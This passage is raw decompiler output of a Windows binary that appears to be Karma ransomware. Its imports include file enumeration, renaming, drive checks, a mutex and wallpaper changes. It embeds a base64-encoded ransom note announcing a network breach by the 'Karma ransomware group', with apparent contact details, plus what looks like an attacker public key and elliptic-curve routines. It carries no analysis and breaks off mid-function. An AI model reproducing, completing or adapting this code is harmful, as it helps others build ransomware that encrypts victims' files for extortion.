/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __fastcall sub_401000(_DWORD *a1, int *a2, int a3);
__m128i *__fastcall sub_4010F0(int *a1, int a2, _BYTE *a3);
int __fastcall sub_401240(_DWORD *a1, int *a2);
int __fastcall sub_401480(int *a1, __m128i *a2);
__m128i *__fastcall sub_4015A0(int *a1, __m128i *a2, int *a3, __m128i *a4);
int __fastcall sub_4018C0(int *a1, __m128i *a2, int a3);
int __cdecl sub_4019E0(unsigned int a1);
// DWORD __usercall start@<eax>(SIZE_T a1@<ebx>, int a2@<edi>);
int __thiscall sub_401D00(_WORD *this);
_WORD *__fastcall sub_401D10(int a1, int a2);
_WORD *__fastcall sub_401D30(_WORD *a1, __int16 *a2);
DWORD __thiscall sub_401D60(LPCWSTR lpFileName);
// LPCVOID __usercall sub_401DF0@<eax>(SIZE_T a1@<ebx>, int a2@<edi>, int a3@<esi>);
_DWORD *__fastcall sub_402070(__int16 *a1, _DWORD *a2);
BOOL __fastcall sub_4021B0(int a1, __int16 *a2);
_BYTE *sub_402280();
HANDLE sub_402320();
HANDLE __thiscall sub_402760(LPCWSTR lpFileName);
HANDLE __thiscall sub_402D30(_BYTE *this);
DWORD __stdcall StartAddress(int *lpThreadParameter);
void sub_4035D0();
int __thiscall sub_4036A0(int *this);
int __thiscall sub_403780(int *this);
unsigned int __thiscall sub_403860(char *this);
unsigned int __cdecl sub_403910(_OWORD *a1, char *a2, int a3);
int __cdecl sub_403A60(int *a1, int a2, int a3, unsigned int a4);

//-------------------------------------------------------------------------
// Data declarations

// extern COLORREF (__stdcall *GetPixel)(HDC hdc, int x, int y);
// extern BOOL (__stdcall *DeleteDC)(HDC hdc);
// extern BOOL (__stdcall *GetTextExtentPoint32W)(HDC hdc, LPCWSTR lpString, int c, LPSIZE psizl);
// extern COLORREF (__stdcall *SetTextColor)(HDC hdc, COLORREF color);
// extern int (__stdcall *SetBkMode)(HDC hdc, int mode);
// extern COLORREF (__stdcall *SetBkColor)(HDC hdc, COLORREF color);
// extern BOOL (__stdcall *DeleteObject)(HGDIOBJ ho);
// extern HFONT (__stdcall *CreateFontW)(int cHeight, int cWidth, int cEscapement, int cOrientation, int cWeight, DWORD bItalic, DWORD bUnderline, DWORD bStrikeOut, DWORD iCharSet, DWORD iOutPrecision, DWORD iClipPrecision, DWORD iQuality, DWORD iPitchAndFamily, LPCWSTR pszFaceName);
// extern COLORREF (__stdcall *SetPixel)(HDC hdc, int x, int y, COLORREF color);
// extern HDC (__stdcall *CreateCompatibleDC)(HDC hdc);
// extern HBITMAP (__stdcall *CreateDIBSection)(HDC hdc, const BITMAPINFO *pbmi, UINT usage, void **ppvBits, HANDLE hSection, DWORD offset);
// extern HGDIOBJ (__stdcall *SelectObject)(HDC hdc, HGDIOBJ h);
// extern HBITMAP (__stdcall *CreateCompatibleBitmap)(HDC hdc, int cx, int cy);
// extern BOOL (__stdcall *BitBlt)(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
// extern BOOL (__stdcall *WriteConsoleW)(HANDLE hConsoleOutput, const void *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID lpReserved);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern BOOL (__stdcall *MoveFileW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HGLOBAL (__stdcall *GlobalAlloc)(UINT uFlags, SIZE_T dwBytes);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern DWORD (__stdcall *GetLastError)();
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern DWORD (__stdcall *GetTempPathW)(DWORD nBufferLength, LPWSTR lpBuffer);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern int (__stdcall *DrawTextW)(HDC hdc, LPCWSTR lpchText, int cchText, LPRECT lprc, UINT format);
// extern BOOL (__stdcall *SystemParametersInfoW)(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni);
// extern int (__stdcall *ReleaseDC)(HWND hWnd, HDC hDC);
// extern int (__stdcall *GetSystemMetrics)(int nIndex);
// extern HDC (__stdcall *GetDC)(HWND hWnd);
_UNKNOWN unk_404150; // weak
char byte_4043EC[] = { '1' }; // weak
__int16 word_4043F8[] = { 46 }; // weak
__int16 word_404404[] = { 46 }; // weak
__int16 word_40440C[] = { 119 }; // weak
__int16 word_40441C[] = { 36 }; // weak
__int16 word_404438[] = { 97 }; // weak
__int16 word_40444C[] = { 100 }; // weak
__int16 word_404468[] = { 112 }; // weak
__int16 word_404478[] = { 112 }; // weak
__int16 word_404490[] = { 97 }; // weak
__int16 word_4044A0[] = { 112 }; // weak
__int16 word_4044BC[] = { 112 }; // weak
__int16 word_4044E4[] = { 100 }; // weak
__int16 word_4044F4[] = { 115 }; // weak
__int16 word_40452C[] = { 115 }; // weak
__int16 word_404540[] = { 46 }; // weak
__int16 word_40454C[] = { 46 }; // weak
__int16 word_404558[] = { 46 }; // weak
__int16 word_404564[] = { 46 }; // weak
__int16 word_404570[] = { 46 }; // weak
WCHAR word_404598[1652] =
{
  87u,
  87u,
  57u,
  49u,
  99u,
  105u,
  66u,
  117u,
  90u,
  88u,
  82u,
  51u,
  98u,
  51u,
  74u,
  114u,
  73u,
  71u,
  104u,
  104u,
  99u,
  121u,
  66u,
  105u,
  90u,
  87u,
  86u,
  117u,
  73u,
  71u,
  74u,
  121u,
  90u,
  87u,
  70u,
  106u,
  97u,
  71u,
  86u,
  107u,
  73u,
  71u,
  74u,
  53u,
  73u,
  69u,
  116u,
  104u,
  99u,
  109u,
  49u,
  104u,
  73u,
  72u,
  74u,
  104u,
  98u,
  110u,
  78u,
  118u,
  98u,
  88u,
  100u,
  104u,
  99u,
  109u,
  85u,
  103u,
  90u,
  51u,
  74u,
  118u,
  100u,
  88u,
  65u,
  117u,
  68u,
  81u,
  112u,
  88u,
  90u,
  83u,
  66u,
  111u,
  89u,
  88u,
  90u,
  108u,
  73u,
  71u,
  86u,
  52u,
  100u,
  72u,
  74u,
  104u,
  89u,
  51u,
  82u,
  108u,
  90u,
  67u,
  66u,
  50u,
  89u,
  87u,
  120u,
  49u,
  89u,
  87u,
  74u,
  115u,
  90u,
  83u,
  66u,
  118u,
  99u,
  105u,
  66u,
  122u,
  90u,
  87u,
  53u,
  122u,
  97u,
  88u,
  82u,
  112u,
  100u,
  109u,
  85u,
  103u,
  90u,
  71u,
  70u,
  48u,
  89u,
  83u,
  66u,
  109u,
  99u,
  109u,
  57u,
  116u,
  73u,
  72u,
  108u,
  118u,
  100u,
  88u,
  73u,
  103u,
  98u,
  109u,
  86u,
  48u,
  100u,
  50u,
  57u,
  121u,
  97u,
  121u,
  66u,
  104u,
  98u,
  109u,
  81u,
  103u,
  90u,
  87u,
  53u,
  106u,
  99u,
  110u,
  108u,
  119u,
  100u,
  71u,
  86u,
  107u,
  73u,
  72u,
  82u,
  111u,
  90u,
  83u,
  66u,
  107u,
  89u,
  88u,
  82u,
  104u,
  73u,
  71u,
  57u,
  117u,
  73u,
  72u,
  108u,
  118u,
  100u,
  88u,
  73u,
  103u,
  99u,
  51u,
  108u,
  122u,
  100u,
  71u,
  86u,
  116u,
  99u,
  121u,
  52u,
  103u,
  68u,
  81u,
  111u,
  78u,
  67u,
  107u,
  82u,
  108u,
  89u,
  51u,
  74u,
  53u,
  99u,
  72u,
  82u,
  112u,
  98u,
  50u,
  52u,
  103u,
  97u,
  88u,
  77u,
  103u,
  98u,
  50u,
  53u,
  115u,
  101u,
  83u,
  66u,
  119u,
  98u,
  51u,
  78u,
  122u,
  97u,
  87u,
  74u,
  115u,
  90u,
  83u,
  66u,
  51u,
  97u,
  88u,
  82u,
  111u,
  73u,
  71u,
  69u,
  103u,
  99u,
  72u,
  74u,
  112u,
  100u,
  109u,
  70u,
  48u,
  90u,
  83u,
  66u,
  114u,
  90u,
  88u,
  107u,
  103u,
  100u,
  71u,
  104u,
  104u,
  100u,
  67u,
  66u,
  118u,
  98u,
  109u,
  120u,
  53u,
  73u,
  72u,
  100u,
  108u,
  73u,
  72u,
  66u,
  118u,
  99u,
  51u,
  78u,
  108u,
  99u,
  121u,
  52u,
  78u,
  67u,
  107u,
  57u,
  49u,
  99u,
  105u,
  66u,
  110u,
  99u,
  109u,
  57u,
  49u,
  99u,
  67u,
  100u,
  122u,
  73u,
  71u,
  57u,
  117u,
  98u,
  72u,
  107u,
  103u,
  89u,
  87u,
  108u,
  116u,
  73u,
  71u,
  108u,
  122u,
  73u,
  72u,
  82u,
  118u,
  73u,
  71u,
  90u,
  112u,
  98u,
  109u,
  70u,
  117u,
  89u,
  50u,
  108u,
  104u,
  98u,
  71u,
  120u,
  53u,
  73u,
  71u,
  74u,
  108u,
  98u,
  109u,
  86u,
  109u,
  97u,
  88u,
  81u,
  103u,
  90u,
  110u,
  74u,
  118u,
  98u,
  83u,
  66u,
  118u,
  100u,
  88u,
  73u,
  103u,
  89u,
  110u,
  74u,
  112u,
  90u,
  87u,
  89u,
  103u,
  89u,
  87u,
  78u,
  120u,
  100u,
  87u,
  70u,
  112u,
  98u,
  110u,
  82u,
  104u,
  98u,
  109u,
  78u,
  108u,
  76u,
  72u,
  82u,
  111u,
  97u,
  88u,
  77u,
  103u,
  97u,
  88u,
  77u,
  103u,
  89u,
  83u,
  66u,
  110u,
  100u,
  87u,
  70u,
  121u,
  89u,
  87u,
  53u,
  48u,
  90u,
  87u,
  85u,
  103u,
  100u,
  71u,
  104u,
  104u,
  100u,
  67u,
  66u,
  51u,
  90u,
  83u,
  66u,
  51u,
  97u,
  87u,
  120u,
  115u,
  73u,
  71u,
  82u,
  118u,
  73u,
  72u,
  100u,
  111u,
  89u,
  88u,
  81u,
  103u,
  100u,
  50u,
  85u,
  103u,
  99u,
  72u,
  74u,
  118u,
  98u,
  87u,
  108u,
  122u,
  90u,
  83u,
  52u,
  78u,
  67u,
  108u,
  78u,
  106u,
  89u,
  87u,
  49u,
  116u,
  97u,
  87u,
  53u,
  110u,
  73u,
  71u,
  108u,
  122u,
  73u,
  71u,
  112u,
  49u,
  99u,
  51u,
  81u,
  103u,
  89u,
  109u,
  70u,
  107u,
  73u,
  71u,
  90u,
  118u,
  99u,
  105u,
  66u,
  105u,
  100u,
  88u,
  78u,
  112u,
  98u,
  109u,
  86u,
  122u,
  99u,
  121u,
  66u,
  112u,
  98u,
  105u,
  66u,
  48u,
  97u,
  71u,
  108u,
  122u,
  73u,
  71u,
  120u,
  112u,
  98u,
  109u,
  85u,
  103u,
  98u,
  50u,
  89u,
  103u,
  100u,
  50u,
  57u,
  121u,
  97u,
  121u,
  52u,
  78u,
  67u,
  103u,
  48u,
  75u,
  81u,
  50u,
  57u,
  117u,
  100u,
  71u,
  70u,
  106u,
  100u,
  67u,
  66u,
  49u,
  99u,
  121u,
  66u,
  48u,
  98u,
  121u,
  66u,
  117u,
  90u,
  87u,
  100u,
  118u,
  100u,
  71u,
  108u,
  104u,
  100u,
  71u,
  85u,
  103u,
  100u,
  71u,
  104u,
  108u,
  73u,
  72u,
  82u,
  108u,
  99u,
  109u,
  49u,
  122u,
  73u,
  71u,
  57u,
  109u,
  73u,
  72u,
  74u,
  108u,
  100u,
  109u,
  86u,
  121u,
  99u,
  50u,
  108u,
  117u,
  90u,
  121u,
  66u,
  48u,
  97u,
  71u,
  85u,
  103u,
  90u,
  71u,
  70u,
  116u,
  89u,
  87u,
  100u,
  108u,
  73u,
  72u,
  100u,
  108u,
  73u,
  71u,
  104u,
  104u,
  100u,
  109u,
  85u,
  103u,
  90u,
  71u,
  57u,
  117u,
  90u,
  83u,
  66u,
  104u,
  98u,
  109u,
  81u,
  103u,
  90u,
  71u,
  86u,
  115u,
  90u,
  88u,
  82u,
  112u,
  98u,
  109u,
  99u,
  103u,
  100u,
  71u,
  104u,
  108u,
  73u,
  71u,
  82u,
  104u,
  100u,
  71u,
  69u,
  103u,
  100u,
  50u,
  85u,
  103u,
  97u,
  71u,
  70u,
  50u,
  90u,
  83u,
  66u,
  107u,
  98u,
  51u,
  100u,
  117u,
  98u,
  71u,
  57u,
  104u,
  90u,
  71u,
  86u,
  107u,
  76u,
  103u,
  48u,
  75u,
  86u,
  50u,
  85u,
  103u,
  89u,
  87u,
  82u,
  50u,
  97u,
  88u,
  78u,
  108u,
  73u,
  72u,
  108u,
  118u,
  100u,
  83u,
  66u,
  117u,
  98u,
  51u,
  81u,
  103u,
  100u,
  71u,
  56u,
  103u,
  100u,
  88u,
  78u,
  108u,
  73u,
  71u,
  70u,
  117u,
  101u,
  83u,
  66u,
  107u,
  89u,
  88u,
  82u,
  104u,
  73u,
  72u,
  74u,
  108u,
  89u,
  50u,
  57u,
  50u,
  90u,
  88u,
  74u,
  53u,
  73u,
  72u,
  82u,
  118u,
  98u,
  50u,
  120u,
  122u,
  73u,
  72u,
  100u,
  112u,
  100u,
  71u,
  104u,
  118u,
  100u,
  88u,
  81u,
  103u,
  98u,
  71u,
  86u,
  104u,
  100u,
  109u,
  108u,
  117u,
  90u,
  121u,
  66u,
  106u,
  98u,
  51u,
  66u,
  112u,
  90u,
  88u,
  77u,
  103u,
  98u,
  50u,
  89u,
  103u,
  100u,
  71u,
  104u,
  108u,
  73u,
  71u,
  108u,
  117u,
  97u,
  88u,
  82u,
  112u,
  89u,
  87u,
  119u,
  103u,
  90u,
  87u,
  53u,
  106u,
  99u,
  110u,
  108u,
  119u,
  100u,
  71u,
  86u,
  107u,
  73u,
  71u,
  90u,
  112u,
  98u,
  71u,
  85u,
  117u,
  68u,
  81u,
  112u,
  90u,
  98u,
  51u,
  85u,
  103u,
  89u,
  88u,
  74u,
  108u,
  73u,
  72u,
  74u,
  112u,
  99u,
  50u,
  116u,
  112u,
  98u,
  109u,
  99u,
  103u,
  97u,
  88u,
  74u,
  121u,
  90u,
  88u,
  90u,
  108u,
  99u,
  110u,
  78u,
  112u,
  89u,
  109u,
  120u,
  53u,
  73u,
  71u,
  82u,
  104u,
  98u,
  87u,
  70u,
  110u,
  97u,
  87u,
  53u,
  110u,
  73u,
  72u,
  82u,
  111u,
  90u,
  83u,
  66u,
  109u,
  97u,
  87u,
  120u,
  108u,
  73u,
  71u,
  74u,
  53u,
  73u,
  71u,
  82u,
  118u,
  97u,
  87u,
  53u,
  110u,
  73u,
  72u,
  82u,
  111u,
  97u,
  88u,
  77u,
  117u,
  73u,
  65u,
  48u,
  75u,
  68u,
  81u,
  112u,
  74u,
  90u,
  105u,
  66u,
  51u,
  90u,
  83u,
  66u,
  104u,
  99u,
  109u,
  85u,
  103u,
  98u,
  109u,
  57u,
  48u,
  73u,
  71u,
  78u,
  118u,
  98u,
  110u,
  82u,
  104u,
  89u,
  51u,
  82u,
  108u,
  90u,
  67u,
  66u,
  118u,
  99u,
  105u,
  66u,
  112u,
  90u,
  105u,
  66u,
  51u,
  90u,
  83u,
  66u,
  107u,
  98u,
  121u,
  66u,
  117u,
  98u,
  51u,
  81u,
  103u,
  99u,
  109u,
  86u,
  104u,
  89u,
  50u,
  103u,
  103u,
  89u,
  87u,
  52u,
  103u,
  89u,
  87u,
  100u,
  121u,
  90u,
  87u,
  86u,
  116u,
  90u,
  87u,
  53u,
  48u,
  73u,
  72u,
  100u,
  108u,
  73u,
  72u,
  100u,
  112u,
  98u,
  71u,
  119u,
  103u,
  98u,
  71u,
  86u,
  104u,
  97u,
  121u,
  66u,
  53u,
  98u,
  51u,
  86u,
  121u,
  73u,
  71u,
  82u,
  104u,
  100u,
  71u,
  69u,
  103u,
  100u,
  71u,
  56u,
  103u,
  97u,
  109u,
  57u,
  49u,
  99u,
  109u,
  53u,
  104u,
  98u,
  71u,
  108u,
  122u,
  100u,
  72u,
  77u,
  103u,
  89u,
  87u,
  53u,
  107u,
  73u,
  72u,
  66u,
  49u,
  89u,
  109u,
  120u,
  112u,
  99u,
  50u,
  103u,
  103u,
  97u,
  88u,
  81u,
  103u,
  98u,
  50u,
  52u,
  103u,
  98u,
  51u,
  86u,
  121u,
  73u,
  72u,
  100u,
  108u,
  89u,
  110u,
  78u,
  112u,
  100u,
  71u,
  85u,
  117u,
  68u,
  81u,
  112u,
  111u,
  100u,
  72u,
  82u,
  119u,
  79u,
  105u,
  56u,
  118u,
  77u,
  50u,
  53u,
  50u,
  101u,
  110u,
  70u,
  53u,
  98u,
  122u,
  90u,
  115u,
  78u,
  72u,
  100u,
  114u,
  99u,
  110u,
  112u,
  49u,
  98u,
  88u,
  112u,
  49u,
  78u,
  87u,
  70u,
  118u,
  90u,
  68u,
  100u,
  54u,
  89u,
  109u,
  57u,
  122u,
  99u,
  84u,
  82u,
  112u,
  99u,
  71u,
  100u,
  109u,
  78u,
  50u,
  108u,
  109u,
  90u,
  50u,
  111u,
  122u,
  97u,
  72u,
  78u,
  50u,
  89u,
  109u,
  78u,
  121u,
  78u,
  88u,
  90u,
  106u,
  89u,
  88u,
  78u,
  118u,
  99u,
  109u,
  82u,
  50u,
  99u,
  87u,
  81u,
  117u,
  98u,
  50u,
  53u,
  112u,
  98u,
  50u,
  52u,
  118u,
  68u,
  81u,
  111u,
  78u,
  67u,
  107u,
  108u,
  109u,
  73u,
  71u,
  69u,
  103u,
  99u,
  109u,
  70u,
  117u,
  99u,
  50u,
  57u,
  116u,
  73u,
  71u,
  108u,
  122u,
  73u,
  72u,
  66u,
  104u,
  101u,
  87u,
  86u,
  107u,
  73u,
  72u,
  100u,
  108u,
  73u,
  72u,
  100u,
  112u,
  98u,
  71u,
  119u,
  103u,
  99u,
  72u,
  74u,
  118u,
  100u,
  109u,
  108u,
  107u,
  90u,
  83u,
  66u,
  48u,
  97u,
  71u,
  85u,
  103u,
  90u,
  71u,
  86u,
  106u,
  99u,
  110u,
  108u,
  119u,
  100u,
  71u,
  108u,
  118u,
  98u,
  105u,
  66u,
  114u,
  90u,
  88u,
  107u,
  103u,
  89u,
  87u,
  53u,
  107u,
  73u,
  72u,
  66u,
  121u,
  98u,
  50u,
  57u,
  109u,
  73u,
  72u,
  82u,
  111u,
  89u,
  88u,
  81u,
  103u,
  100u,
  50u,
  85u,
  103u,
  90u,
  71u,
  86u,
  115u,
  90u,
  88u,
  82u,
  108u,
  90u,
  67u,
  66u,
  53u,
  98u,
  51u,
  85u,
  103u,
  90u,
  71u,
  70u,
  48u,
  89u,
  83u,
  52u,
  78u,
  67u,
  108u,
  100u,
  111u,
  90u,
  87u,
  52u,
  103u,
  101u,
  87u,
  57u,
  49u,
  73u,
  71u,
  78u,
  118u,
  98u,
  110u,
  82u,
  104u,
  89u,
  51u,
  81u,
  103u,
  100u,
  88u,
  77u,
  103u,
  100u,
  50u,
  85u,
  103u,
  100u,
  50u,
  108u,
  115u,
  98u,
  67u,
  66u,
  119u,
  99u,
  109u,
  57u,
  50u,
  97u,
  87u,
  82u,
  108u,
  73u,
  72u,
  108u,
  118u,
  100u,
  83u,
  66u,
  119u,
  99u,
  109u,
  57u,
  118u,
  90u,
  105u,
  66u,
  48u,
  97u,
  71u,
  70u,
  48u,
  73u,
  72u,
  100u,
  108u,
  73u,
  71u,
  78u,
  104u,
  98u,
  105u,
  66u,
  107u,
  90u,
  87u,
  78u,
  121u,
  101u,
  88u,
  66u,
  48u,
  73u,
  72u,
  108u,
  118u,
  100u,
  88u,
  73u,
  103u,
  90u,
  109u,
  108u,
  115u,
  90u,
  88u,
  77u,
  103u,
  89u,
  87u,
  53u,
  107u,
  73u,
  72u,
  82u,
  111u,
  89u,
  88u,
  81u,
  103u,
  100u,
  50u,
  85u,
  103u,
  97u,
  71u,
  70u,
  50u,
  90u,
  83u,
  66u,
  107u,
  98u,
  51u,
  100u,
  117u,
  98u,
  71u,
  57u,
  104u,
  90u,
  71u,
  86u,
  107u,
  73u,
  72u,
  108u,
  118u,
  100u,
  88u,
  73u,
  103u,
  90u,
  71u,
  70u,
  48u,
  89u,
  83u,
  52u,
  78u,
  67u,
  103u,
  48u,
  75u,
  83u,
  71u,
  57u,
  51u,
  73u,
  72u,
  82u,
  118u,
  73u,
  71u,
  78u,
  118u,
  98u,
  110u,
  82u,
  104u,
  89u,
  51u,
  81u,
  103u,
  100u,
  88u,
  77u,
  54u,
  68u,
  81u,
  111u,
  78u,
  67u,
  108u,
  90u,
  112u,
  98u,
  109u,
  78u,
  108u,
  82u,
  50u,
  108u,
  115u,
  89u,
  109u,
  86u,
  121u,
  100u,
  69u,
  66u,
  48u,
  100u,
  88u,
  82u,
  104u,
  98u,
  109u,
  57u,
  48u,
  89u,
  83u,
  53u,
  106u,
  98u,
  50u,
  48u,
  78u,
  67u,
  107u,
  112u,
  108u,
  99u,
  110u,
  78u,
  108u,
  101u,
  86u,
  78u,
  116u,
  97u,
  88u,
  82u,
  111u,
  77u,
  84u,
  107u,
  52u,
  78u,
  107u,
  66u,
  118u,
  98u,
  109u,
  108u,
  118u,
  98u,
  109u,
  49u,
  104u,
  97u,
  87u,
  119u,
  117u,
  98u,
  51u,
  74u,
  110u,
  68u,
  81u,
  112u,
  121u,
  97u,
  87u,
  78u,
  111u,
  89u,
  88u,
  74u,
  107u,
  89u,
  110u,
  74u,
  49u,
  98u,
  110u,
  78u,
  118u,
  98u,
  106u,
  69u,
  52u,
  79u,
  84u,
  74u,
  65u,
  99u,
  72u,
  74u,
  118u,
  100u,
  71u,
  57u,
  117u,
  98u,
  87u,
  70u,
  112u,
  98u,
  67u,
  53u,
  106u,
  98u,
  50u,
  48u,
  103u,
  0u,
  0u,
  0u,
  0u
}; // weak
WCHAR word_405280[90] =
{
  51u,
  56u,
  78u,
  70u,
  105u,
  76u,
  89u,
  102u,
  98u,
  104u,
  70u,
  99u,
  51u,
  53u,
  115u,
  120u,
  100u,
  75u,
  120u,
  73u,
  74u,
  122u,
  56u,
  71u,
  90u,
  82u,
  84u,
  72u,
  43u,
  106u,
  66u,
  88u,
  56u,
  69u,
  85u,
  98u,
  106u,
  84u,
  56u,
  65u,
  65u,
  65u,
  67u,
  100u,
  115u,
  102u,
  97u,
  52u,
  43u,
  77u,
  102u,
  97u,
  116u,
  53u,
  77u,
  66u,
  55u,
  77u,
  54u,
  105u,
  67u,
  89u,
  71u,
  117u,
  97u,
  122u,
  43u,
  81u,
  80u,
  66u,
  82u,
  119u,
  111u,
  80u,
  67u,
  43u,
  120u,
  52u,
  120u,
  108u,
  49u,
  81u,
  65u,
  65u,
  65u,
  65u,
  61u,
  61u,
  0u,
  0u
}; // weak
__int16 word_405334[6] = { 75, 65, 82, 77, 65, 0 }; // weak
int dword_406000; // weak
int dword_406004; // weak
LPCVOID lpBuffer; // idb
int dword_40600C; // weak
int dword_406010; // weak
HMODULE dword_406014; // idb
HMODULE hModule; // idb


//----- (00401000) --------------------------------------------------------
int __fastcall sub_401000(_DWORD *a1, int *a2, int a3)
{
  _DWORD *v4; // edi
  int v5; // edx
  int v6; // ebx
  int v7; // eax
  int result; // eax
  unsigned int v9; // esi
  char v10; // bl
  unsigned int v11; // edx
  int v12; // eax
  unsigned int v13; // esi
  int v14; // eax
  unsigned int v15; // edx
  unsigned int v16; // edi
  unsigned int v17; // esi
  int v18; // edx
  char v19; // [esp+18h] [ebp+8h]

  v4 = a1;
  v5 = 0;
  v6 = a3 / 32;
  if ( a3 / 32 <= 0 || (v5 = a3 / 32, memset(a1, 0, 4 * v6), v4 = a1, v6 < 8) )
  {
    do
    {
      v7 = *a2++;
      v4[v5++] = v7;
    }
    while ( v5 < 8 );
  }
  result = a3 & 0x1F;
  v19 = result;
  if ( result )
  {
    v9 = v4[6];
    v10 = 32 - result;
    v4[7] = (v4[7] << result) | (v9 >> (32 - result));
    v11 = v4[5];
    v12 = (v9 << result) | (v11 >> (32 - result));
    v13 = v4[4];
    v4[6] = v12;
    v14 = (v11 << v19) | (v13 >> v10);
    v15 = v4[3];
    v4[5] = v14;
    v4[4] = (v13 << v19) | (v15 >> v10);
    v16 = v4[2];
    v17 = a1[1];
    a1[3] = (v15 << v19) | (v16 >> v10);
    a1[2] = (v16 << v19) | (v17 >> v10);
    result = (v17 << v19) | (*a1 >> v10);
    v18 = *a1 << v19;
    a1[1] = result;
    *a1 = v18;
  }
  return result;
}

//----- (004010F0) --------------------------------------------------------
__m128i *__fastcall sub_4010F0(int *a1, int a2, _BYTE *a3)
{
  bool v3; // zf
  int v5; // ecx
  int v6; // eax
  int v7; // eax
  int i; // esi
  int j; // eax
  __m128i *result; // eax
  int v11; // ecx
  int v12; // [esp+Ch] [ebp-20h] BYREF
  __int64 v13; // [esp+10h] [ebp-1Ch]
  int v14; // [esp+18h] [ebp-14h]
  int v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+20h] [ebp-Ch]
  int v17; // [esp+24h] [ebp-8h]
  int v18; // [esp+28h] [ebp-4h]

  v13 = *(_QWORD *)(a2 + 4);
  v14 = *(_DWORD *)(a2 + 12);
  v15 = *(_DWORD *)(a2 + 16);
  v3 = (*a3 & 1) == 0;
  v16 = *(_DWORD *)(a2 + 20);
  v17 = *(_DWORD *)(a2 + 24);
  v5 = *(_DWORD *)a2;
  v6 = *(_DWORD *)(a2 + 28);
  v12 = *(_DWORD *)a2;
  v18 = v6;
  if ( v3 )
  {
    *a1 = 0;
    v7 = 0;
    a1[1] = 0;
    a1[2] = 0;
    a1[3] = 0;
    a1[4] = 0;
    a1[5] = 0;
    a1[6] = 0;
  }
  else
  {
    *a1 = v5;
    a1[1] = *(_DWORD *)(a2 + 4);
    a1[2] = *(_DWORD *)(a2 + 8);
    a1[3] = *(_DWORD *)(a2 + 12);
    a1[4] = *(_DWORD *)(a2 + 16);
    a1[5] = *(_DWORD *)(a2 + 20);
    a1[6] = *(_DWORD *)(a2 + 24);
    v7 = *(_DWORD *)(a2 + 28);
  }
  a1[7] = v7;
  for ( i = 1; i < 233; ++i )
  {
    sub_401000(&v12, &v12, 1);
    if ( (v18 & 0x200) != 0 )
    {
      for ( j = 0; j < 32; j += 16 )
        *(__m128i *)((char *)&v12 + j) = _mm_xor_si128(*(__m128i *)(j + 4211024), *(__m128i *)((char *)&v12 + j));
    }
    result = (__m128i *)(*(_DWORD *)&a3[4 * ((unsigned int)i >> 5)] >> (i & 0x1F));
    if ( ((unsigned __int8)result & 1) != 0 )
    {
      result = (__m128i *)a1;
      v11 = 2;
      do
      {
        ++result;
        result[-1] = _mm_xor_si128(*(__m128i *)((char *)&result[-1] + (char *)&v12 - (char *)a1), result[-1]);
        --v11;
      }
      while ( v11 );
    }
  }
  return result;
}

//----- (00401240) --------------------------------------------------------
int __fastcall sub_401240(_DWORD *a1, int *a2)
{
  int v3; // eax
  int v4; // esi
  int v5; // eax
  __int128 v6; // xmm3
  __int128 v7; // xmm2
  __int128 v8; // xmm5
  __int128 v9; // xmm4
  int result; // eax
  int v11; // esi
  char *v12; // eax
  int v13; // ecx
  unsigned int v14; // eax
  int v15; // eax
  __int128 *v16; // ecx
  int v17; // edx
  unsigned int v18; // ecx
